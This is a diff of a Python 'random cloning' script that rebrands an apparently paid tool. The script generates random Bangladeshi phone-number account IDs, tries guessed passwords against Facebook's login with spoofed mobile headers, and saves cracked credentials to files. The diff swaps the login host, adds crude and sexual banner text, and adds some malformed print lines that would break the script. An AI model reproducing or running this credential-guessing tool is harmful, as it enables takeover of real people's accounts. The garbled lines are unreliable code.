@@ -177,27 +177,29 @@ else:
 logo ="""  \x1b[1;97m
    
 
- /$$   /$$ /$$   /$$
-| $$$ | $$| $$  / $$
-| $$$$| $$|  $$/ $$/
-| $$ $$ $$ \  $$$$/ 
-| $$  $$$$  >$$  $$ 
-| $$\  $$$ /$$/\  $$
-| $$ \  $$| $$  \ $$
-|__/  \__/|__/  |__/                                                    
+
+\x1b[1;92m     dMMMMMP .aMMMb  dMP dMMMMMMP dMP dMP        .dMMMb  dMMMMb  .aMMMb         dMMMMb  .aMMMb  dMMMMb  dMp
+\x1b[1;92m    dMP     dMP"dMP amr    dMP   dMP dMP        dMP" VP dMP.dMP dMP"dMP        dMP"dMP dMP"dMP dMP dMP dMp
+\x1b[1;92m   dMMMP   dMMMMMP dMP    dMP   dMMMMMP         VMMMb  dMMMMK" dMMMMMP        dMMMMK" dMP dMP dMP dMP dMp
+\x1b[1;92m  dMP     dMP dMP dMP    dMP   dMP dMP        dP .dMP dMP"AMF dMP dMP        dMP.aMF dMP.aMP dMP dMP dMp 
+\x1b[1;92m dMP dMP dMP    dMP   dMP dMP         VMMMP" dMP dMP dMP dMP        dMMMMP"  VMMMP" dMP dMP dMp  dMpdMp
+                                                                                                      
+                                                
 \x1b[1;92m┏───────────────────────────────────────────────┓
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mALAMIN     
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mUSE.ONLY.WHATSAPP & TELEGRAM                
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801790226005              
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mBD RANDOM CLONING 
+\x1b[1;92m |\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m  DEVELOPER \x1b[1;97m: \x1b[1;92m𝐅𝐀𝐈𝐓𝐇_𝐒𝐑𝐀_𝐁𝐎𝐍🌸
+\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92m𝐅𝐀𝐈𝐓𝐇_𝐒𝐑𝐀_𝐁𝐎𝐍🥵     
+\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92m𝐔𝐒𝐄-𝐎𝐍𝐋𝐘-𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 & 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌🌸               
+\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801790226005🌸              
+\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92m𝐁𝐃 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆🌸
 \x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mPAID🔥
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSRABON2126         
+\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92m𝐒𝐑𝐀𝐁𝐎𝐍2126🌸
+ \x1b[1;92m|   \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m  SYSTEM \x1b[1;97m: \x1b[1;92m𝐃𝐀𝐓𝐀 + 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊𝐈𝐍𝐆🌸   
 \x1b[1;92m┗───────────────────────────────────────────────┛
 \033[1;93m─────────────────────────────────────────────────────
-\x1b[1;95m             
+\x1b[1;95m            𝐒𝐄𝐗 𝐏𝐘𝐓𝐇𝐎𝐍🌸 ======𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐍𝐎𝐓 𝐀𝐋𝐋𝐎𝐖 & 𝐅𝐔𝐂𝐊 𝐘𝐎𝐔❌
 \033[1;93m─────────────────────────────────────────────────────  """
 clear()
-os.system("xdg-open https://www.facebook.com/profile.php?id=100079326046999&mibextid=ZbWKwL")
+os.system("xdg-open https://www.facebook.com/profile.php?id=100078879198748&mibextid=ZbWKwL")
 xxxx = str(len(ugen))
 print('\033[1;93m─────────────────────────────────────────────────────') 
 print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
@@ -252,6 +254,7 @@ def MAMUN():
     print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
     print('\033[1;93m─────────────────────────────────────────────────────') 
     print(f"\033[1;97m[01] \033[1;92mRANDOM CLONE ")
+    print(f"\033[1;97m[02] \033[1;92mCONTACT ADMIN")
     print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
     print(f"\033[1;97m[00] \033[1;92mEXIT ")
     print('\033[1;93m─────────────────────────────────────────────────────') 
@@ -274,14 +277,14 @@ def passx():
     print('\033[1;93m─────────────────────────────────────────────────────') 
     print('              \x1b[97m\033[37;41m[ PASSWORD METHOD ]\033[0;m ')
     print('\033[1;93m─────────────────────────────────────────────────────') 
-    print("\033[1;97m[01] \033[1;92mMETHOD 1")
-    print("\033[1;97m[02] \033[1;92mMETHOD 2")
-    print("\033[1;97m[03] \033[1;92mMETHOD 3")
-    print("\033[1;97m[04] \033[1;92mMETHOD 4")
-    print("\033[1;97m[05] \033[1;92mMETHOD 5")
-    print("\033[1;97m[06] \033[1;92mMETHOD 6")
-    print("\033[1;97m[06] \033[1;92mMETHOD 7")
-    print("\033[1;97m[06] \033[1;92mMETHOD 8")
+    print("\033[1;97m[01] \033[1;92mMETHOD 1"𝐀")
+    print("\033[1;97m[02] \033[1;92mMETHOD 2"𝐁")
+    print("\033[1;97m[03] \033[1;92mMETHOD 3"𝐌")
+    print("\033[1;97m[04] \033[1;92mMETHOD 4"𝐅")
+    print("\033[1;97m[05] \033[1;92mMETHOD 5"𝐒")
+    print("\033[1;97m[06] \033[1;92mMETHOD 6"𝐑")
+    print("\033[1;97m[06] \033[1;92mMETHOD 7"𝐁")
+    print("\033[1;97m[06] \033[1;92mMETHOD 8"𝐍")
     print('\033[1;93m─────────────────────────────────────────────────────') 
     adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m")
     if adi in ["1","01"]:
@@ -301,15 +304,15 @@ def pass1():
     print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE ]\033[0;m")
     print('\033[1;93m─────────────────────────────────────────────────────')
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
-    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
-    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m𝐈 𝐋𝐎𝐕𝐄 𝐘𝐎𝐔😍🖤🌸')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m𝐘𝐎𝐔 𝐂𝐎𝐌𝐄 𝐁𝐀𝐂𝐊☺️🌸 ')
     print('\033[1;93m─────────────────────────────────────────────────────')
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m')
     os.system("clear")
     print(logo)
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print('\033[1;93m─────────────────────────────────────────────────────')
-    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000\n\033[1;93m───────────────────────────────────────────────────── \n\033[1;97m[+]\033[1;92m CHOOSE \033[1;91m: \033[1;96m'))
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000, 7000, 9000\n\033[1;93m───────────────────────────────────────────────────── \n\033[1;97m[+]\033[1;92m CHOOSE \033[1;91m: \033[1;96m'))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -388,7 +391,7 @@ def freeq(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             pro = random.choice(ugen)
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -401,42 +404,47 @@ def freeq(uid,pwx,tl):
             "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'm.facebook.com',
-            "method": 'GET',
-            "path": '/?tbua=1',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            "referer": 'https://m.facebook.com/',
-            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": '"Android"',
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro,}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            header_freefb = {
+             'authority': 'x.facebook.com',
+    "method": 'GET',
+    "path": '/?tbua=1',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'vpd=v1%3B807x412x2.625; datr=i024ZPapato5PIyg-72KLHs2; sb=i024ZGvDBxuhx29HOrowX1Og; m_pixel_ratio=2.625; wd=412x807; fr=01iu3yKTFkrnHwxMo..BkuE2L.4A.AAA.0.0.BkuPAk.AWUhthPDbbE',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent':pro,}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print(f'\r\33[1;97m[\033[1;96mALAMIN🌸-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
+                print(f'\r\33[1;97m[\033[1;96m𝐅𝐀𝐈𝐓𝐇_𝐒𝐑𝐀_𝐁𝐎𝐍☺️🌸-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                 cek_apk(session,coki)
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r\33[1;97m[\033[1;91mALAMIN❌-CP\033[1;97m]\033[1;91m '+cid+' | '+ps+' ')
+                    print(f'\r\33[1;97m[\033[1;91m𝐅𝐀𝐈𝐓𝐇_𝐒𝐑𝐀_𝐁𝐎𝐍🥹❌-CP\033[1;97m]\033[1;91m '+cid+' | '+ps+' ')
                     open('/sdcard/CP.txt', 'a').write(cid+' | '+ps+'\n')
                     cp.append(cid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mALAMIN🌸\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92m𝐅𝐀𝐈𝐓𝐇_𝐒𝐑𝐀_𝐁𝐎𝐍🌸\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
